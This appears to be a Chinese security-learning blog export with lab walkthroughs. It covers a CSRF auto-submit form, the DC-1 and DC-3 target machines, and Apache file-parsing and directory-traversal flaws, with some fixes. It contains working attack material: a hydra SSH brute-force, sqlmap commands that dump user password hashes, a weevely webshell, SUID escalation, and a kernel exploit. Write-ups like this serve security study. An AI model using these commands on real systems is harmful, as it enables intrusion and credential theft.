<p><img src="/2020/04/03/csrf-lou-dong-xue-xi/QQ%E6%88%AA%E5%9B%BE20200129174206.png" alt></p>
<h5 id="CSRF-POST"><a href="#CSRF-POST" class="headerlink" title="CSRF(POST)"></a>CSRF(POST)</h5><p>POST型，所有参数在请求体中提交，我们不能通过伪造URL的方式进行攻击。</p>
<p>这里的攻击方式跟XSS中POST类型是一样的，攻击者可以搭建一个站点，在站点上做一个表单，诱导lucy点击这个链接，当用户点击时，就会自动向存在CSRF的服务器提交POST请求修改个人信息。</p>
<p>我们编写一个自动提交表单的html文件：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="built_in">window</span>.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">  <span class="built_in">document</span>.getElementById(<span class="string">"postsubmit"</span>).click();</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">"post"</span> <span class="attr">action</span>=<span class="string">"http://192.168.171.133/pikachu/vul/csrf/csrfpost/csrf_post_edit.php"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">"sex"</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"sex"</span> <span class="attr">value</span>=<span class="string">"girl"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">"phonenum"</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"phonenum"</span> <span class="attr">value</span>=<span class="string">"12345678922"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">"add"</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"add"</span> <span class="attr">value</span>=<span class="string">"hacker"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">"email"</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"email"</span> <span class="attr">value</span>=<span class="string">"lucy@pikachu.com"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">"postsubmit"</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">name</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"submit"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>​      下面把页面的URL发送给受害者，只要受害者一点击这个链接，就会自动往服务器发送POST请求，修改地址信息。</p>
<h5 id="CSRF（token"><a href="#CSRF（token" class="headerlink" title="CSRF（token)"></a>CSRF（token)</h5><p> CSRF的主要问题是敏感操作容易被伪造，我们可以加入Token让请求不容易被伪造</p>
<ul>
<li><p>每次请求，都增加一个随机码(需要够随机，不容易被伪造），后台每次对这个随机码进行验证</p>
<p>我们进入Pikachu平台的CSRF（token）页面并登录，我们可以看一下这个GET请求</p>
</li>
</ul>
<p><img src="/2020/04/03/csrf-lou-dong-xue-xi/QQ%E6%88%AA%E5%9B%BE20200203172940.png" alt></p>
<p>跟前面比较，这里多了一个Token，如果后台对提交的Token进行了验证，由于Token是随机的，我们就无法伪造URL了</p>
<h5 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h5><p><a href="https://xz.aliyun.com/t/7297" target="_blank" rel="noopener">https://xz.aliyun.com/t/7297</a></p>
<p><a href="https://xz.aliyun.com/t/240" target="_blank" rel="noopener">https://xz.aliyun.com/t/240</a></p>
<p><a href="https://cloud.tencent.com/developer/article/1472698" target="_blank" rel="noopener">https://cloud.tencent.com/developer/article/1472698</a></p>
<p><a href="https://blog.csdn.net/SKI_12/article/details/60477557" target="_blank" rel="noopener">https://blog.csdn.net/SKI_12/article/details/60477557</a></p>
]]></content>
      <categories>
        <category>web漏洞学习</category>
      </categories>
      <tags>
        <tag>CSRF学习</tag>
      </tags>
  </entry>
  <entry>
    <title>DC-1靶机学习</title>
    <url>/2020/04/03/dc-1-ba-ji-xue-xi/</url>
    <content><![CDATA[<h2 id="DC-1靶机学习"><a href="#DC-1靶机学习" class="headerlink" title="DC-1靶机学习"></a>DC-1靶机学习</h2><h4 id="第一步、搭建dc-1和kali虚拟机，使用-nat模式"><a href="#第一步、搭建dc-1和kali虚拟机，使用-nat模式" class="headerlink" title="第一步、搭建dc-1和kali虚拟机，使用.nat模式"></a>第一步、搭建dc-1和kali虚拟机，使用.nat模式</h4><p><img src="/2020/04/03/dc-1-ba-ji-xue-xi/QQ%E6%88%AA%E5%9B%BE20200204102843.png" alt></p>
<p>我们进入DC-1的登录界面，然后回到kali攻击机准备入侵。</p>
<h4 id="第二步、扫描出靶机的ip地址"><a href="#第二步、扫描出靶机的ip地址" class="headerlink" title="第二步、扫描出靶机的ip地址"></a>第二步、扫描出靶机的ip地址</h4><p>1.我们可以使用nmap进行二层的主机发现</p>
<p><code>nmap -sn 192.168.153.0/24</code></p>
<p><img src="/2020/04/03/dc-1-ba-ji-xue-xi/QQ%E6%88%AA%E5%9B%BE20200204103154.png" alt></p>
<p>2.使用netdiscover进行主机发现</p>
<p><code>netdiscover -i eth0 -r 192.168.153.0/24</code></p>
<p><img src="/2020/04/03/dc-1-ba-ji-xue-xi/QQ%E6%88%AA%E5%9B%BE20200204114216.png" alt></p>
<p>3.使用arp-scan进行主机发现</p>
<p><code>arp-scan -l</code></p>
<p><img src="/2020/04/03/dc-1-ba-ji-xue-xi/QQ%E6%88%AA%E5%9B%BE20200204114720.png" alt></p>
<h4 id="第三步、靶机的信息收集"><a href="#第三步、靶机的信息收集" class="headerlink" title="第三步、靶机的信息收集"></a>第三步、靶机的信息收集</h4><p>我们使用nmap对该靶机进行扫描。</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">nmap -A -p <span class="number">1</span><span class="number">-65535</span> <span class="number">192.168</span><span class="number">.153</span><span class="number">.150</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/03/dc-1-ba-ji-xue-xi/QQ%E6%88%AA%E5%9B%BE20200204103823.png" alt></p>
<p>我们发现开放的80(tcp) 22（ssh) 111(tcp)端口，并且可以看出使用的CMS为Drupal7。</p>
<p>我们从浏览器访问该IP的80页面</p>
<p><img src="/2020/04/03/dc-1-ba-ji-xue-xi/QQ%E6%88%AA%E5%9B%BE20200204104045.png" alt></p>
<p>我们使用Wappalyzer进行网站的指纹识别，得到更详细的信息。</p>
<p><img src="/2020/04/03/dc-1-ba-ji-xue-xi/QQ%E6%88%AA%E5%9B%BE20200204115356.png" alt></p>
<h4 id="第四步、使用msf入侵目标系统"><a href="#第四步、使用msf入侵目标系统" class="headerlink" title="第四步、使用msf入侵目标系统"></a>第四步、使用msf入侵目标系统</h4><p>进入msf控制台，使用search命令查找关于Drupal的历史漏洞。</p>
<p><img src="/2020/04/03/dc-1-ba-ji-xue-xi/QQ%E6%88%AA%E5%9B%BE20200204104359.png" alt></p>
<p><img src="/2020/04/03/dc-1-ba-ji-xue-xi/QQ%E6%88%AA%E5%9B%BE20200204104445.png" alt></p>
<p>我们选择极好等级的并且日期较近的漏洞进行利用，可以提高成功概率。</p>
<p><img src="/2020/04/03/dc-1-ba-ji-xue-xi/QQ%E6%88%AA%E5%9B%BE20200204104853.png" alt></p>
<p>我们使用set命令设置目标机器，使用run或exploit命令开始攻击。</p>
<p>看到出现meterpreter证明成功入侵系统。</p>
<h4 id="第五步、获取flag-1"><a href="#第五步、获取flag-1" class="headerlink" title="第五步、获取flag 1"></a>第五步、获取flag 1</h4><p>我们执行shell命令获得shell.</p>
<p>ls后发现目录下存在flag1.txt.</p>
<p><img src="/2020/04/03/dc-1-ba-ji-xue-xi/QQ%E6%88%AA%E5%9B%BE20200204105001.png" alt></p>
<p>我们cat flag1.txt读取内容。</p>
<p><img src="/2020/04/03/dc-1-ba-ji-xue-xi/QQ%E6%88%AA%E5%9B%BE20200204105042.png" alt></p>
<p>翻译：每一个好的CMS都需要一个配置文件，你也一样。</p>
<h4 id="第六步、获取flag2-txt"><a href="#第六步、获取flag2-txt" class="headerlink" title="第六步、获取flag2.txt"></a>第六步、获取flag2.txt</h4><p>我们通过百度查询到该cms的配置文件 ：/var/www/sites/default</p>
<p>我们使用cd命令切换到该目录，读取目录下的setting.php文件。</p>
<p><img src="/2020/04/03/dc-1-ba-ji-xue-xi/QQ%E6%88%AA%E5%9B%BE20200204110426.png" alt></p>
<p>我们找到了flag2.txt并读取内容。</p>
<p><img src="/2020/04/03/dc-1-ba-ji-xue-xi/QQ%E6%88%AA%E5%9B%BE20200204110442.png" alt></p>
<p>翻译：暴力和字典攻击不是获取访问权限的唯一方式。并且将需要访问权限。并且给出了mysql数据库的账号和密码。</p>
<p><img src="/2020/04/03/dc-1-ba-ji-xue-xi/QQ%E6%88%AA%E5%9B%BE20200204110617.png" alt></p>
<h4 id="第七步、获取flag4-txt"><a href="#第七步、获取flag4-txt" class="headerlink" title="第七步、获取flag4.txt"></a>第七步、获取flag4.txt</h4><p>我们可以先看一下/etc/passwd中的内容，意外发现了flag4的账号名</p>
<p>/etc/passwd 储存了用户重要信息，一般可读但不可写</p>
<p><img src="/2020/04/03/dc-1-ba-ji-xue-xi/QQ%E6%88%AA%E5%9B%BE20200204115756.png" alt></p>
<p>我们尝试使用john+hydra进行暴力破解。</p>
<figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line">hydra -l flag4 -p<span class="regexp">/Users/</span>john<span class="number">-1.8</span><span class="number">.0</span><span class="regexp">/run/</span>password.lst <span class="string">ssh:</span><span class="comment">//192.168.153.150</span></span><br></pre></td></tr></table></figure>

<p>-l 指定用户名<br> -P 加载密码字典（这里使用了John the Ripper安装后提供的密码本，一般在john-1.8.0/run/password.lst)<br> ssh://ip 指定使用协议和ip地址</p>
<p><img src="/2020/04/03/dc-1-ba-ji-xue-xi/QQ%E6%88%AA%E5%9B%BE20200204120356.png" alt></p>
<p>得到了flag4账号对应的密码为orange</p>
<p>我们使用kali ssh远程登录 </p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">ssh <span class="symbol">flag4@</span><span class="number">192.168</span><span class="number">.153</span><span class="number">.150</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/03/dc-1-ba-ji-xue-xi/QQ%E6%88%AA%E5%9B%BE20200204120529.png" alt></p>
<p>ls后发现flag4.txt文件，尝试cat读取。</p>
<p><img src="/2020/04/03/dc-1-ba-ji-xue-xi/QQ%E6%88%AA%E5%9B%BE20200204121509.png" alt></p>
<p>翻译:您可以使用相同的方法在根目录中查找或访问标志吗?可能。但也许不是那么容易。或许是这样？</p>
<p>可能我们需要提权。</p>
<h4 id="第八步、获得-thefinalflag-txt"><a href="#第八步、获得-thefinalflag-txt" class="headerlink" title="第八步、获得 thefinalflag.txt"></a>第八步、获得 thefinalflag.txt</h4><p>由flag3.txt可知，我们需要获取root权限才能读取最终的flag</p>
<p>由于对提取部分知识不够，参考别人的教程要利用suid提权</p>
<p>suid是Linux的一个权限机制，在执行使用suid权限的文件时候，调用者会暂时有该文件的root权限。</p>
<p>首先我们使用<code>find / -perm -4000 2&gt;/dev/null</code>发现系统上运行的所有SUID可执行文件。</p>
<p><img src="/2020/04/03/dc-1-ba-ji-xue-xi/QQ%E6%88%AA%E5%9B%BE20200204122116.png" alt></p>
<p>发现find命令被设置为suid权限位</p>
<p><img src="/2020/04/03/dc-1-ba-ji-xue-xi/QQ%E6%88%AA%E5%9B%BE20200204122420.png" alt></p>
<p>之后我们通过find命令提权，使用whoami查看用户权限。</p>
<p>之后进入 root目录下查看最终的flag.</p>
<p><strong>完</strong></p>
]]></content>
      <categories>
        <category>渗透测试学习</category>
      </categories>
      <tags>
        <tag>DC-1靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>DC-3靶机</title>
    <url>/2020/03/12/dc-3-ba-ji/</url>
    <content><![CDATA[<h2 id="DC-3靶机学习"><a href="#DC-3靶机学习" class="headerlink" title="DC-3靶机学习"></a>DC-3靶机学习</h2><h4 id="第一步、靶机安装与主机发现"><a href="#第一步、靶机安装与主机发现" class="headerlink" title="第一步、靶机安装与主机发现"></a>第一步、靶机安装与主机发现</h4><p>我们打开靶机，首先设置.nat连接，然后打开kali攻击机</p>
<p>使用nmap进行二层主机发现</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">nmap -sn <span class="number">192.168</span><span class="number">.153</span><span class="number">.1</span>/<span class="number">24</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/12/dc-3-ba-ji/QQ%E6%88%AA%E5%9B%BE20200215121855.png" alt></p>
<h4 id="第二步、端口扫描与信息收集"><a href="#第二步、端口扫描与信息收集" class="headerlink" title="第二步、端口扫描与信息收集"></a>第二步、端口扫描与信息收集</h4><p>使用nmap进行简单的系统版本检测扫描。</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">nmap -sV <span class="number">192.168</span><span class="number">.153</span><span class="number">.153</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/12/dc-3-ba-ji/QQ%E6%88%AA%E5%9B%BE20200215121959.png" alt></p>
<p>发现80端口开放且运行Apache服务。</p>
<p>我们网页访问IP的80端口</p>
<p><img src="/2020/03/12/dc-3-ba-ji/QQ%E6%88%AA%E5%9B%BE20200215122332.png" alt></p>
<p>使用Wappalyzer进行指纹识别，发现使用的Joomla系统建站。</p>
<h4 id="第三步、joomscan扫描"><a href="#第三步、joomscan扫描" class="headerlink" title="第三步、joomscan扫描"></a>第三步、joomscan扫描</h4><p>​        OWASPJoomla！漏洞扫描器（JoomScan）是一个开源项目，其主要目的是实现漏洞检测的自动化，以增强Joomla CMS开发的安全性。该工具基于Perl开发，能够轻松无缝地对各种Joomla项目进行漏洞扫描，其轻量化和模块化的架构能够保证扫描过程中不会留下过多的痕迹。它不仅能够检测已知漏洞，而且还能够检测到很多错误配置漏洞和管理权限漏洞等等。除此之外，OWASP JoomScan使用起来非常简单，不仅提供了非常友好的用户界面，而且还能够以HTML或文本格式导出扫描报告</p>
<pre><code>不知道为什么，我的kali里好像没有这个工具。。。</code></pre><p>我们从github上根据教程安装下载后。使用命令检测joomla的相关配置</p>
<figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line">perl joomscan.pl -u <span class="string">http:</span><span class="comment">//192.168.153.153</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/12/dc-3-ba-ji/QQ%E6%88%AA%E5%9B%BE20200215123552.png" alt></p>
<p>我们得到了该Joomla的具体版本号为3.7.0.</p>
<h4 id="第四步、searchsploit工具查找漏洞"><a href="#第四步、searchsploit工具查找漏洞" class="headerlink" title="第四步、searchsploit工具查找漏洞"></a>第四步、searchsploit工具查找漏洞</h4><p>使用searchsploit工具查找Joomla 3.7.0 版本存在的漏洞。</p>
<p><img src="/2020/03/12/dc-3-ba-ji/QQ%E6%88%AA%E5%9B%BE20200215123726.png" alt></p>
<p>发现存在一个sql注入漏洞。</p>
<p>我们将该漏洞文档复制到根目录下，然后打开。</p>
<figure class="highlight dts"><table><tr><td class="code"><pre><span class="line">cp <span class="meta-keyword">/usr/</span>share<span class="meta-keyword">/exploitdb/</span>exploits<span class="meta-keyword">/php/</span>webapps/<span class="number">42033.</span>txt joomla-sql.txt</span><br><span class="line">cat joomla-sql.txt</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/12/dc-3-ba-ji/QQ%E6%88%AA%E5%9B%BE20200215124403.png" alt></p>
<p>文档中给出了sqlmap自动注入的payload.</p>
<h4 id="第五步、sqlmap自动注入"><a href="#第五步、sqlmap自动注入" class="headerlink" title="第五步、sqlmap自动注入"></a>第五步、sqlmap自动注入</h4><p>使用sqlmap自动注入工具对靶机执行sql注入代码。</p>
<ul>
<li>查询所有数据库：</li>
</ul>
<figure class="highlight asciidoc"><table><tr><td class="code"><pre><span class="line">sqlmap -u "<span class="link">http://192.168.153.153/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list</span>[<span class="string">fullordering</span>]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/12/dc-3-ba-ji/QQ%E6%88%AA%E5%9B%BE20200215124833.png" alt></p>
<p>查询当前使用数据库：</p>
<figure class="highlight asciidoc"><table><tr><td class="code"><pre><span class="line">sqlmap -u "<span class="link">http://192.168.153.153/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list</span>[<span class="string">fullordering</span>]=updatexml" --risk=3 --level=5 --random-agent --current-db -p list[fullordering]</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/12/dc-3-ba-ji/QQ%E6%88%AA%E5%9B%BE20200215124955.png" alt></p>
<p>查询joomladb数据库下的表：</p>
<figure class="highlight asciidoc"><table><tr><td class="code"><pre><span class="line">sqlmap -u "<span class="link">http://192.168.153.153/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list</span>[<span class="string">fullordering</span>]=updatexml" --risk=3 --level=5 --random-agent -D "joomladb" --tables  -p list[fullordering]</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/12/dc-3-ba-ji/QQ%E6%88%AA%E5%9B%BE20200215125207.png" alt></p>
<p>我们判断users表中应该有我们想要的账号密码，查询该表中的列：</p>
<figure class="highlight asciidoc"><table><tr><td class="code"><pre><span class="line">sqlmap -u "<span class="link">http://192.168.153.153/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list</span>[<span class="string">fullordering</span>]=updatexml" --risk=3 --level=5 --random-agent -D "joomladb" -T "#_<span class="emphasis">_users" --columns  -p list[fullordering]</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/12/dc-3-ba-ji/QQ%E6%88%AA%E5%9B%BE20200215125855.png" alt></p>
<p>最后我们输出name,password的信息：</p>
<figure class="highlight asciidoc"><table><tr><td class="code"><pre><span class="line">sqlmap  -u "<span class="link">http://192.168.153.153/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list</span>[<span class="string">fullordering</span>]=updatexml" --risk=3 --level=5 --random-agent -D "joomladb" -T "#_<span class="emphasis">_users" -C "name,password" --dump  -p list[fullordering]</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/12/dc-3-ba-ji/QQ%E6%88%AA%E5%9B%BE20200215130011.png" alt></p>
<h4 id="第六步、后台反弹getshell"><a href="#第六步、后台反弹getshell" class="headerlink" title="第六步、后台反弹getshell"></a>第六步、后台反弹getshell</h4><p>我们首先利用使用john爆破hash值：snoopy</p>
<p><img src="/2020/03/12/dc-3-ba-ji/QQ%E6%88%AA%E5%9B%BE20200215130350.png" alt></p>
<p>使用dirsearch扫出后台文件</p>
<p><img src="/2020/03/12/dc-3-ba-ji/QQ%E6%88%AA%E5%9B%BE20200215133942.png" alt></p>
<p>进入后台登录页面并登录</p>
<p><img src="/2020/03/12/dc-3-ba-ji/QQ%E6%88%AA%E5%9B%BE20200215134103.png" alt></p>
<p>选择Templates模板，选择templates第一个模板即可，</p>
<p><img src="/2020/03/12/dc-3-ba-ji/QQ%E6%88%AA%E5%9B%BE20200215134629.png" alt></p>
<p>用weevely生成php后门文件.</p>
<p><img src="/2020/03/12/dc-3-ba-ji/QQ%E6%88%AA%E5%9B%BE20200215142748.png" alt></p>
<p><img src="/2020/03/12/dc-3-ba-ji/QQ%E6%88%AA%E5%9B%BE20200215142836.png" alt></p>
<p><img src="/2020/03/12/dc-3-ba-ji/QQ%E6%88%AA%E5%9B%BE20200215144846.png" alt></p>
<p>复制代码新建webshell.php文件，粘贴代码，保存</p>
<p>然后用weevely连，成功拿到shell.</p>
<h4 id="第七步、提权"><a href="#第七步、提权" class="headerlink" title="第七步、提权"></a>第七步、提权</h4><p>​    使用uname命令可知系统内核</p>
<p>Ubuntu 16.04，我们可以尝试使用kali自带的earchsploit工具查找Ubuntu 16.04的提权漏洞。</p>
<p><img src="/2020/03/12/dc-3-ba-ji/QQ%E6%88%AA%E5%9B%BE20200215145305.png" alt></p>
<p>我们将这个漏洞的详细文件复制到root根目录下，然后查看</p>
<p><img src="/2020/03/12/dc-3-ba-ji/QQ%E6%88%AA%E5%9B%BE20200218161711.png" alt></p>
<p>我们将exp下载下来然后经过一系列的解压后</p>
<figure class="highlight properties"><table><tr><td class="code"><pre><span class="line"><span class="attr">unzip</span> <span class="string">39772.zip </span></span><br><span class="line"></span><br><span class="line"><span class="attr">cd</span> <span class="string">39772</span></span><br><span class="line"></span><br><span class="line"><span class="attr">tar</span> <span class="string">-xvf exploit.tar  </span></span><br><span class="line"></span><br><span class="line"><span class="attr">cd</span> <span class="string">ebpf_mapfd_doubleput_exploit</span></span><br></pre></td></tr></table></figure>

<p>依次执行./compile.sh   </p>
<p>​                ./doubleput</p>
<p><img src="/2020/03/12/dc-3-ba-ji/QQ%E6%88%AA%E5%9B%BE20200218161152.png" alt></p>
<p>但是不知道为什么一直没法成功。。。。。</p>
]]></content>
      <categories>
        <category>渗透测试学习</category>
      </categories>
      <tags>
        <tag>DC-3靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>Apache中间件漏洞学习</title>
    <url>/2020/04/02/apachhe-zhong-jian-jian-lou-dong/</url>
    <content><![CDATA[<h3 id="Apache中间件漏洞复现"><a href="#Apache中间件漏洞复现" class="headerlink" title="Apache中间件漏洞复现"></a>Apache中间件漏洞复现</h3><h4 id="关于apache"><a href="#关于apache" class="headerlink" title="关于apache"></a>关于apache</h4><h5 id="apache简介"><a href="#apache简介" class="headerlink" title="apache简介"></a>apache简介</h5><p>​       Apache HTTP Server（简称Apache）是Apache软件基金会的一个开放源码的网页服务器，可以在大多数计算机操作系统中运行，由于其多平台和安全性被广泛使用，是最流行的Web服务器端软件之一。它快速、可靠并且可通过简单的API扩展，将Perl/Python等解释器编译到服务器中。</p>
<h5 id="Apache的目录结构："><a href="#Apache的目录结构：" class="headerlink" title="Apache的目录结构："></a>Apache的目录结构：</h5><ul>
<li>bin——-存放常用的命令工具，例如httpd</li>
<li>cgi-bin—存放Linux下常用的命令，例如xxx.sh</li>
<li>conf——Linux的配置相关文件，例如httpd.conf</li>
<li>error—–错误记录</li>
<li>htdocs—-放网站源码</li>
<li>icons—–网站图标</li>
<li>logs——日志</li>
<li>modules—扩展模块</li>
<li>manual—-手册</li>
</ul>
<h5 id="apache原理介绍"><a href="#apache原理介绍" class="headerlink" title="apache原理介绍:"></a>apache原理介绍:</h5><p>要讲到的Apahce的漏洞必须要理解Apache的运行原理。</p>
<p><img src="/2020/04/02/apachhe-zhong-jian-jian-lou-dong/v2-61e13c6df766e990c4e228d3222fee36_720w.jpg" alt></p>
<p>图中简易描述了Apahce与PHP配合完成了一次WEB请求，Apahce在前，PHP在后，那两者之间如何进行通信的呢？先了解下PHP的架构。如下图</p>
<p><img src="/2020/04/02/apachhe-zhong-jian-jian-lou-dong/v2-7692da2f8367d3fff6ef09df67fba07a_720w.jpg" alt></p>
<ul>
<li>Zend Engine是PHP的底层实现，包含编译和执行，底层由C语言实现。</li>
<li>Zend API、Zend Extension API是基于Zend底层对外封装提供服务。</li>
<li>Extendions使用Extension API实现了扩展库、标准库，例如各种内置函数、MySQL连接库等</li>
<li>SAPI是重点，全称是Server Application Programming Interface，也就是服务端应用编程接口。PHP就是通过它来和Apache、Nginx、FastCGI交互</li>
<li>Application是最上层，也就是我们写的PHP代码了</li>
</ul>
<p>Apache本身是不支持PHP解析的,通过架构图我们可以知道是通过SAPI进行通信，那Apache如何和SAPI通信呢？Apache怎么知道什么类型的文件要解析为PHP？如果你手动搭建过Apache解析PHP的环境，就肯定了解这两个步骤：</p>
<figure class="highlight axapta"><table><tr><td class="code"><pre><span class="line"><span class="meta"># 加载php5_module模块</span></span><br><span class="line">LoadModule php5_module php5apache2_2.dll的路径</span><br><span class="line"><span class="meta"># 添加可以执行php的文件类型，让.php文件类型解析为PHP</span></span><br><span class="line">AddType application/x-httpd-php .php</span><br><span class="line"><span class="meta"># 或者将AddType变为下面的(在Apache 2.4.0~2.4.29中默认使用了该方式)</span></span><br><span class="line">&lt;FilesMatch \.php$&gt;</span><br><span class="line">    SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br><span class="line">以及</span><br><span class="line">&lt;IfModule dir_module&gt;</span><br><span class="line">DirectoryIndex <span class="keyword">index</span>.html <span class="keyword">index</span>.htm <span class="keyword">index</span>.php <span class="keyword">index</span>.phtml</span><br><span class="line">&lt;/IfModule&gt;</span><br></pre></td></tr></table></figure>

<p>​    Apache通过LoadModule来加载php5_module模块（php5apache2_2.dll），这样做的目的是让Apache加载php5_module模块来解析PHP文件。意思其实就是用LoadModule来加载php5_module。也就是把php作为Apache的一个子模块来运行。当通过Web访问php文件时，Apache就会调用php5_module来解析php代码。<br>调用过程可以概括为</p>
<figure class="highlight xl"><table><tr><td class="code"><pre><span class="line">HTTP-&gt;A<span class="function"><span class="title">pahce</span>-&gt;</span><span class="function"><span class="title">php5_module</span>-&gt;</span><span class="function"><span class="title">sapi</span>-&gt;</span>php。</span><br></pre></td></tr></table></figure>

<h4 id="Apache-文件解析漏洞"><a href="#Apache-文件解析漏洞" class="headerlink" title="Apache 文件解析漏洞"></a>Apache 文件解析漏洞</h4><h5 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h5><p>​       Apache文件解析漏洞与用户的配置有密切关系，严格来说属于用户的配置问题。Apache文件解析漏洞涉及到一个解析文件的特性。Apache默认一个文件可以有多个以点分隔的后缀，当右边的后缀无法识别，则继续向左识别，发现后缀是php,交给php处理这个文件。</p>
<h5 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h5><p>我们首先打开phpstudy，切换apache版本为5.2.17.</p>
<p><img src="/2020/04/02/apachhe-zhong-jian-jian-lou-dong/QQ%E6%88%AA%E5%9B%BE20200201102616.png" alt></p>
<p>我们在本地网站根目录下新建文本文档写入任意字母。</p>
<p><img src="/2020/04/02/apachhe-zhong-jian-jian-lou-dong/QQ%E6%88%AA%E5%9B%BE20200201104725.png" alt></p>
<p>我们尝试修改后缀名为不存在的.456，然后在本地访问该文件</p>
<p><img src="/2020/04/02/apachhe-zhong-jian-jian-lou-dong/QQ%E6%88%AA%E5%9B%BE20200201104035.png" alt></p>
<p><img src="/2020/04/02/apachhe-zhong-jian-jian-lou-dong/QQ%E6%88%AA%E5%9B%BE20200201104057.png" alt></p>
<p>发现仍然可以成功读取</p>
<p>我们继续修改后缀名</p>
<p><img src="/2020/04/02/apachhe-zhong-jian-jian-lou-dong/QQ%E6%88%AA%E5%9B%BE20200201104123.png" alt></p>
<p><img src="/2020/04/02/apachhe-zhong-jian-jian-lou-dong/QQ%E6%88%AA%E5%9B%BE20200201104141.png" alt></p>
<p>发现服务器仍然可以解析</p>
<p>我们修改为.php.360尝试，依然可以成功解析。</p>
<p><img src="/2020/04/02/apachhe-zhong-jian-jian-lou-dong/QQ%E6%88%AA%E5%9B%BE20200201104210.png" alt></p>
<p><img src="/2020/04/02/apachhe-zhong-jian-jian-lou-dong/QQ%E6%88%AA%E5%9B%BE20200201104231.png" alt></p>
<p>那么我们在文件上传时就可以利用Apache的解析特性进行绕过</p>
<h5 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h5><p>在httpd.conf或httpd-vhosts.conf中加入以下语句，从而禁止文件名格式为<em>.php.\</em>的访问权限：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;FilesMatch <span class="string">".(php.|php3.|php4|php5.)"</span>&gt;</span><br><span class="line">Order Deny,Allow</span><br><span class="line">Deny from all</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure>



<h4 id="Apache-目录遍历漏洞"><a href="#Apache-目录遍历漏洞" class="headerlink" title="Apache 目录遍历漏洞"></a>Apache 目录遍历漏洞</h4><h5 id="漏洞原理-1"><a href="#漏洞原理-1" class="headerlink" title="漏洞原理"></a>漏洞原理</h5><p> 目录遍历（路径遍历）是由于web服务器或者web应用程序对用户输入的文件名称的安全性验证不足而导致的一种安全漏洞。使得攻击者通过利用一些特殊字符就可以绕过服务器的安全限制，访问任意的文件（可以是web根目录以外的文件），甚至执行系统命令。</p>
<p>​      程序在实现上没有充分过滤用户输入的../之类的目录跳转符，导致恶意用户可以通过提交目录跳转来遍历服务器上的任意文件。</p>
<h5 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h5><p>我们打开phpstudy.</p>
<p>然后在本地网站根目录下新建多个子目录</p>
<p><img src="/2020/04/02/apachhe-zhong-jian-jian-lou-dong/QQ%E6%88%AA%E5%9B%BE20200201112807.png" alt></p>
<p>我们此时访问网站</p>
<p><img src="/2020/04/02/apachhe-zhong-jian-jian-lou-dong/18d8bc3eb13533fa38aa502b974b3d1a41345b31.jpg" alt></p>
